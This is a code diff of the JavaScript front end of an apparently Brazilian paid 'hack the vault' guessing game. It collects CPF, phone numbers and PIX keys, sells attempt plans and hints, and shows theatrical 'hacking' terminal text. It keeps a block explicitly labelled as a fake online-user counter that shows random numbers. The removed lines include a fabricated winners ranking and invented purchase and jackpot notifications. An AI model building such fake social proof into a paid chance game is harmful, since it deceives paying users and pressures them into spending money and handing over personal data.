@@ -2,21 +2,18 @@
 const sfx = {
     type: document.getElementById('sfx-type'),
     error: document.getElementById('sfx-error'),
-    win: document.getElementById('sfx-win'),
-    pop: document.getElementById('sfx-pop')
+    win: document.getElementById('sfx-win')
 };
-sfx.pop.volume = 0.4;
 
 function play(sound) {
     if (sound) { sound.currentTime = 0; sound.play().catch(() => {}); }
 }
 
-// --- EFEITO VIBRAR (Haptic Feedback) ---
 function vibrar(ms = 50) {
     if (navigator.vibrate) navigator.vibrate(ms);
 }
 
-// --- EFEITO MATRIX (BACKGROUND) ---
+// --- EFEITO MATRIX (COM TRANSPARÊNCIA) ---
 const canvas = document.getElementById('matrix-canvas');
 const ctx = canvas.getContext('2d');
 
@@ -27,16 +24,20 @@ function resizeCanvas() {
 window.addEventListener('resize', resizeCanvas);
 resizeCanvas();
 
-const chars = '01ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@%&';
+const chars = '01XYZ$#@%';
 const fontSize = 14;
 const columns = canvas.width / fontSize;
 const drops = Array(Math.floor(columns)).fill(1);
 
 function drawMatrix() {
-    ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+    // IMPORTANTE: Limpar com pouca opacidade para deixar rastro, 
+    // mas usando clearRect para garantir que o fundo de imagem apareça
+    // O truque aqui é usar fillStyle com alpha muito baixo para o fade
+    
+    ctx.fillStyle = 'rgba(0, 0, 0, 0.05)'; 
     ctx.fillRect(0, 0, canvas.width, canvas.height);
     
-    ctx.fillStyle = '#0F0';
+    ctx.fillStyle = '#22c55e'; // Verde Hacker
     ctx.font = fontSize + 'px monospace';
     
     for (let i = 0; i < drops.length; i++) {
@@ -49,13 +50,12 @@ function drawMatrix() {
         drops[i]++;
     }
 }
-setInterval(drawMatrix, 40);
+setInterval(drawMatrix, 50);
 
-// --- MÁSCARAS E INICIALIZAÇÃO ---
+// --- INICIALIZAÇÃO ---
 $(document).ready(() => {
     $('#input-tel').mask('(00) 00000-0000');
     $('#input-cpf').mask('000.000.000-00');
-    atualizarRanking(); // Inicia o ranking fake
 });
 
 // --- DADOS ---
@@ -79,9 +79,9 @@ function abrirDicas() {
     $('#val-dica-2').text('R$ ' + p2.toLocaleString('pt-BR', {minimumFractionDigits: 2}));
     $('#val-dica-3').text('R$ ' + p3.toLocaleString('pt-BR', {minimumFractionDigits: 2}));
 
-    $('#btn-dica-1').attr('onclick', `comprarDica(1, ${p1.toFixed(2)}, 'Pista 1 (5%)')`);
-    $('#btn-dica-2').attr('onclick', `comprarDica(2, ${p2.toFixed(2)}, 'Pista 2 (15%)')`);
-    $('#btn-dica-3').attr('onclick', `comprarDica(3, ${p3.toFixed(2)}, 'Pista 3 (50%)')`);
+    $('#btn-dica-1').attr('onclick', `comprarDica(1, ${p1.toFixed(2)}, 'Dica Nível 1')`);
+    $('#btn-dica-2').attr('onclick', `comprarDica(2, ${p2.toFixed(2)}, 'Dica Nível 2')`);
+    $('#btn-dica-3').attr('onclick', `comprarDica(3, ${p3.toFixed(2)}, 'Dica Nível 3')`);
 
     document.getElementById('modal-dicas').classList.remove('hidden');
 }
@@ -91,8 +91,8 @@ function verificarLogin() {
     if (document.getElementById('senha').value.length !== 4) {
         Swal.fire({
             icon: 'warning',
-            title: 'Senha Inválida',
-            text: 'Digite uma senha de 4 dígitos.',
+            title: 'Senha Curta',
+            text: 'A senha deve ter 4 dígitos.',
             confirmButtonColor: '#eab308'
         });
         return;
@@ -114,23 +114,15 @@ function salvarCadastro(e) {
     });
 
     fecharModal('modal-cadastro');
-    Swal.fire({
-        icon: 'success',
-        title: 'Acesso Permitido',
-        text: 'Bem-vindo ao sistema OpenPix.',
-        timer: 1500,
-        showConfirmButton: false
-    });
-    
+    Swal.fire({ icon: 'success', title: 'Cadastro Confirmado', timer: 1500, showConfirmButton: false });
     document.getElementById('modal-planos').classList.remove('hidden');
 }
 
 function selecionarPlano(valor, chances, plano) {
     vibrar();
     fecharModal('modal-planos');
-    $('#btn-texto').html('<i class="fas fa-circle-notch fa-spin"></i> VALIDANDO...');
+    $('#btn-texto').html('<i class="fas fa-sync fa-spin"></i> PROCESSANDO...');
     
-    // Simula tempo de processamento
     setTimeout(() => {
         fetch('/registrar-venda', { 
             method: 'POST', 
@@ -144,15 +136,14 @@ function selecionarPlano(valor, chances, plano) {
 async function comprarDica(nivel, valor, plano) {
     fecharModal('modal-dicas');
     
-    // Substituindo confirm nativo pelo SweetAlert2
     const result = await Swal.fire({
-        title: 'Investir na Dica?',
-        text: `Valor do investimento: R$ ${valor}`,
-        icon: 'question',
+        title: 'Confirmar Compra',
+        text: `Investimento: R$ ${valor}`,
+        icon: 'info',
         showCancelButton: true,
         confirmButtonColor: '#22c55e',
         cancelButtonColor: '#d33',
-        confirmButtonText: 'Sim, hackear!',
+        confirmButtonText: 'Sim, pagar',
         cancelButtonText: 'Cancelar',
         background: '#1a1a1a',
         color: '#fff'
@@ -168,30 +159,28 @@ async function comprarDica(nivel, valor, plano) {
         const data = await res.json();
         
         $('#terminal').removeClass('hidden').css('opacity', '1').empty();
-        log(`INJETANDO EXPLOIT NÍVEL ${nivel}...`, "#eab308");
-        await new Promise(r => setTimeout(r, 800));
-        log(`ACESSO PARCIAL OBTIDO: [ ${data.dica} ]`, "#fff");
+        log(`INICIANDO DECODIFICAÇÃO...`, "#eab308");
+        await new Promise(r => setTimeout(r, 1000));
+        log(`DADOS RECUPERADOS: [ ${data.dica} ]`, "#fff");
         
         Swal.fire({
-            title: 'DICA REVELADA',
-            text: `Os números da senha contém: ${data.dica}`,
+            title: 'DICA RECEBIDA',
+            html: `A senha contém a sequência: <br><b style="font-size:2em; color:#4ade80">${data.dica}</b>`,
             icon: 'success',
             background: '#000',
-            color: '#4ade80'
+            color: '#fff'
         });
     }
 }
 
-// --- FUNÇÃO PARA ANIMAR NÚMEROS (CountUp Simples) ---
+// --- ANIMAÇÃO DE NÚMEROS ---
 function animarValor(elementoId, valorFinal) {
     const elemento = document.getElementById(elementoId);
     if (!elemento) return;
-    
-    // Remove R$, pontos e vírgulas para pegar o número puro anterior
     let valorInicial = parseFloat(elemento.innerText.replace(/[^\d,]/g, '').replace(',', '.'));
     if (isNaN(valorInicial)) valorInicial = 0;
     
-    const duracao = 1000; // 1 segundo
+    const duracao = 1000;
     const inicio = performance.now();
     
     requestAnimationFrame(function step(timestamp) {
@@ -206,10 +195,10 @@ function animarValor(elementoId, valorFinal) {
     });
 }
 
-// --- LÓGICA DO JOGO ---
+// --- LOGICA PRINCIPAL ---
 async function log(m, c = "#4ade80") {
     play(sfx.type);
-    const line = $(`<div class="log-line" style="color:${c}"><i class="fas fa-angle-right"></i> ${m}</div>`);
+    const line = $(`<div class="log-line" style="color:${c}"><i class="fas fa-terminal"></i> ${m}</div>`);
     $('#terminal').append(line);
     $('#terminal').scrollTop($('#terminal')[0].scrollHeight);
 }
@@ -220,12 +209,10 @@ async function iniciarHack() {
     $('#btn-acao').prop('disabled', true);
     $('#terminal').removeClass('hidden').css('opacity', '1').empty();
     
-    await log(`Validando hash criptográfico...`);
+    await log(`Iniciando conexão segura...`);
     await new Promise(r => setTimeout(r, 600));
-    await log("Conectando ao mainframe seguro...");
+    await log(`Testando combinação: [ ${senhaTentativa} ]`);
     await new Promise(r => setTimeout(r, 800));
-    await log(`Tentativa de quebra bruta: [ ${senhaTentativa} ]`);
-    await new Promise(r => setTimeout(r, 1000));
 
     const res = await fetch('/tentar', { 
         method: 'POST', 
@@ -238,29 +225,19 @@ async function iniciarHack() {
     localStorage.setItem('openpix_history', JSON.stringify(historico));
 
     if (data.ganhou) {
-        // VITÓRIA
         play(sfx.win);
-        vibrar([200, 100, 200]); // Vibração de vitória
+        vibrar([200, 100, 200]);
         tokenVitoriaAtual = data.token;
-        
-        await log("ACESSO AUTORIZADO! FIREWALL DERRUBADO.", "#fbbf24");
+        await log("SENHA CORRETA! ACESSO LIBERADO.", "#fbbf24");
         
         $('#valor-vitoria').text(data.premio.toLocaleString('pt-BR', { minimumFractionDigits: 2 }));
-        $('#token-vitoria').text(data.token);
-        
-        setTimeout(() => { 
-            document.getElementById('modal-vitoria').classList.remove('hidden'); 
-            // Dispara confetes se quiser adicionar depois
-        }, 1000);
+        setTimeout(() => { document.getElementById('modal-vitoria').classList.remove('hidden'); }, 1000);
 
     } else {
-        // DERROTA
         play(sfx.error);
-        vibrar(200); // Vibração de erro
-        await log("ERRO: SENHA INCORRETA. ALARME SILENCIOSO.", "#ef4444");
+        vibrar(200);
+        await log("ACESSO NEGADO. SENHA INCORRETA.", "#ef4444");
         $('body').addClass('shake');
-        
-        // Anima o novo valor do prêmio
         animarValor('premio', data.novoPremio);
         
         setTimeout(() => {
@@ -268,34 +245,15 @@ async function iniciarHack() {
             $('#terminal').css('opacity', '0').addClass('hidden');
             $('#senha').val('').prop('disabled', false).focus();
             $('#btn-acao').prop('disabled', false);
-            $('#btn-texto').html('<i class="fas fa-unlock-alt"></i> ABRIR COFRE AGORA'); 
-        }, 1500);
-        
-        Swal.fire({
-            toast: true,
-            position: 'top-end',
-            icon: 'error',
-            title: 'Senha Incorreta',
-            text: 'O valor do prêmio acumulou!',
-            showConfirmButton: false,
-            timer: 3000,
-            background: '#ef4444',
-            color: '#fff'
-        });
+            $('#btn-texto').html('TENTAR NOVAMENTE'); 
+        }, 2000);
     }
 }
 
-// --- FUNÇÃO PARA SOLICITAR SAQUE ---
 async function solicitarSaque() {
     vibrar();
     const pix = $('#pix-vitoria').val();
-    
-    if(!pix) {
-        Swal.fire({ icon: 'error', title: 'Erro', text: 'Informe a Chave PIX.' });
-        return;
-    }
-    
-    const valor = parseFloat($('#valor-vitoria').text().replace('.','').replace(',','.'));
+    if(!pix) return Swal.fire({ icon: 'error', title: 'Erro', text: 'Informe a Chave PIX.' });
     
     await fetch('/solicitar-saque', {
         method: 'POST',
@@ -305,35 +263,31 @@ async function solicitarSaque() {
             pix: pix,
             nome: usuario.nome,
             cpf: usuario.cpf,
-            valor: valor
+            valor: parseFloat($('#valor-vitoria').text().replace('.','').replace(',','.'))
         })
     });
 
     document.getElementById('modal-vitoria').classList.add('hidden');
-    
     Swal.fire({
         icon: 'success',
-        title: 'SAQUE PROCESSADO!',
-        html: 'O valor deve cair na sua conta em até <b>10 minutos</b>.',
-        confirmButtonText: 'VOLTAR AO INÍCIO',
+        title: 'SAQUE REALIZADO!',
+        text: 'O valor estará na sua conta em breve.',
         confirmButtonColor: '#22c55e'
-    }).then(() => {
-        location.reload();
-    });
+    }).then(() => location.reload());
 }
 
 function abrirHistorico() {
     vibrar();
     const lista = $('#lista-historico').empty();
     if (!historico.length) {
-        lista.html('<p class="text-center text-slate-600 mt-10 text-xs">Sem registros.</p>');
+        lista.html('<p class="text-center text-slate-500 mt-10 text-xs">Nenhuma tentativa registrada.</p>');
     } else {
         historico.slice().reverse().forEach(h => {
             lista.append(`
-                <div class="bg-black/40 p-3 rounded-lg border border-slate-700 flex justify-between items-center hover:bg-black/60 transition mb-2">
-                    <span class="font-mono text-lg text-white tracking-widest">${h.senha}</span>
-                    <span class="text-[9px] font-bold px-2 py-1 rounded ${h.ganhou ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'}">
-                        ${h.ganhou ? 'DESBLOQUEADO' : 'BLOQUEADO'}
+                <div class="bg-black/40 p-3 rounded-lg border border-slate-700 flex justify-between items-center mb-2">
+                    <span class="font-mono text-white tracking-widest">${h.senha}</span>
+                    <span class="text-[9px] font-bold px-2 py-1 rounded ${h.ganhou ? 'bg-green-500 text-black' : 'bg-red-500/10 text-red-500'}">
+                        ${h.ganhou ? 'SUCESSO' : 'FALHA'}
                     </span>
                 </div>
             `);
@@ -342,66 +296,12 @@ function abrirHistorico() {
     document.getElementById('modal-historico').classList.remove('hidden');
 }
 
-// --- RANKING FAKE E NOTIFICAÇÕES ---
+// Contador Online Fake
 const contadorEl = document.getElementById('contador-online');
 setInterval(() => {
     let atual = parseInt(contadorEl.innerText);
     let variacao = Math.floor(Math.random() * 5) - 2; 
     let novo = atual + variacao;
     if (novo < 80) novo = 80;
-    if (novo > 500) novo = 500;
     contadorEl.innerText = novo;
 }, 3000);
-
-const nomesRanking = ["João S.", "Maria O.", "Pedro A.", "Lucas F.", "Ana C.", "Carlos M.", "Bruna L."];
-const valoresRanking = [150, 300, 50, 500, 1200, 80];
-
-function gerarGanhadorFake() {
-    const nome = nomesRanking[Math.floor(Math.random() * nomesRanking.length)];
-    const valor = valoresRanking[Math.floor(Math.random() * valoresRanking.length)];
-    const agora = new Date();
-    const tempo = agora.getHours() + ":" + (agora.getMinutes()<10?'0':'') + agora.getMinutes();
-    
-    return `
-        <div class="flex items-center justify-between bg-white/5 p-2 rounded border border-white/5">
-            <div class="flex items-center gap-2">
-                <div class="w-6 h-6 rounded-full bg-green-500/20 flex items-center justify-center text-[10px] text-green-500"><i class="fas fa-check"></i></div>
-                <div class="text-[10px] text-slate-300 font-bold">${nome}</div>
-            </div>
-            <div class="text-[10px] text-green-400 font-mono font-bold">+ R$ ${valor},00 <span class="text-slate-600 ml-1 text-[8px]">${tempo}</span></div>
-        </div>
-    `;
-}
-
-function atualizarRanking() {
-    const container = $('#ranking-container');
-    // Preenche inicial
-    for(let i=0; i<3; i++) container.append(gerarGanhadorFake());
-    
-    // Adiciona novos a cada X segundos
-    setInterval(() => {
-        const novo = $(gerarGanhadorFake()).hide().fadeIn();
-        container.prepend(novo);
-        if(container.children().length > 5) container.children().last().remove();
-    }, 4500);
-}
-
-// Notificações Flutuantes (Popup topo)
-const notificacoes = [
-    { titulo: "Nova Compra", msg: "Alguém comprou 20 tentativas!", cor: "text-green-400" },
-    { titulo: "Oportunidade", msg: "Prêmio acumulou para R$ 1.500,00", cor: "text-yellow-400" },
-    { titulo: "Segurança", msg: "Um usuário errou a senha 3x.", cor: "text-red-400" }
-];
-
-function mostrarNotificacao() {
-    const item = notificacoes[Math.floor(Math.random() * notificacoes.length)];
-    $('#notificacao-titulo').text(item.titulo).attr('class', `font-bold ${item.cor}`);
-    $('#notificacao-msg').text(item.msg);
-    
-    const notif = document.getElementById('notificacao-live');
-    notif.classList.add('active');
-    setTimeout(() => { notif.classList.remove('active'); }, 4000);
-    
-    setTimeout(mostrarNotificacao, Math.random() * 10000 + 5000);
-}
-setTimeout(mostrarNotificacao, 5000);
